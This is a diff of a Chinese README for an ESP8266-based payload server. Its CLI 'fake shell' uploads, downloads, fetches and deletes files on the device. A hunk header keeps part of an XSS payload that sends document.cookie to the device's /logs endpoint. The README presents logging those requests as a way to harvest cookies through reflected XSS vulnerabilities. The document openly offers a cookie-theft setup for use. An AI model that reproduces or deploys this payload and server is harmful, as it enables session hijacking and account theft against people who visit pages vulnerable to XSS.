@@ -2,7 +2,7 @@
 
 ### esp8266闪存文件应用
 
-[详见太极创客](https://www.bilibili.com/video/BV1L7411c7jw?p=8)
+[详见太极创客](www.taichi-maker.com/homepage/esp8266-nodemcu-iot/iot-c/spiffs/upload-files/)
 
 ### 使用的esp8266模块：
 
@@ -61,20 +61,27 @@ img.src = 'http://192.168.1.103/logs?cookie='+encodeURIComponent(document.cookie
 
 ![config.png](./img/config.png)
 
-上传完成之后即可用remote_payload_cli.py连接（可被重命名，记得赋予可执行权限），以下为`remote_payload_cli.py -h`的输出内容：
+上传完成之后即可用remote_payload_cli.py连接（可被重命名，记得赋予可执行权限）
 
 ```
 usage: remote_payloads_cli.py [-h][-r <url:post>][-u <username>][-p <password>]
 description:
     remotely connect to your esp8266 standby with a fake shell.
-shell commands:
-    Command         Description                     Example
-    help            show helpful information        help
-    ls              list dir                        ls /payloads
-    up              upload local file to esp8266    up ~/Desktop/something.js /payloads/other.js
-    cat             show content of a file          cat /payloads/logs
-    rm              remove file or dir              (file)rm /payloads/logs
-                                                    (dir)rm /payloads/
+Command         Description                     Example
+help            show helpful information        help
+ls              list dir                        ls /payloads
+up              upload local file to esp8266    up ~/Desktop/something.js /payloads/other.js
+down            download file from esp8266      down /payloads/something.js ~/Desktop/other.js
+cat             show content of a file          cat /payloads/logs
+rm              remove file or dir              (file)rm /payloads/logs
+                                                (dir)rm /payloads/
+mv              move file or dir                (file)mv /payloads/logs /logs
+                                                (dir)mv /upload/ /payloads/new/
+wget            send a HTTP/HTTPS request and\  wget http://www.baidu.com/robots.txt [-o /tmp/baidu_robots.txt]
+                save the payload to file\
+                default path is '/'+fileName
+clear           clear shell                     clear
+exit            log off and exit                exit
 ```
 
 示例：
@@ -92,6 +99,7 @@ shell commands:
 - url格式为"http://[ip|domain]:port"，末尾**没有**"/"！若端口为80端口，则可忽略
 - `rm /filePath/fileName`将删除filePath下fileName文件，而`rm /filePath/`将删除**整个filePath目录及目录下所有文件**！`rm /`则相当于清空内存
 - 向`http://[ip|domain]:port/logs`发送的请求，将会被esp8266记录下来，默认追加在`/payloads/logs`文件，这可用于反射型XSS漏洞获取cookie
+- 访问`http://[ip|domain]:port/list`，将会列出非隐藏目录下所有文件链接
 
 
 
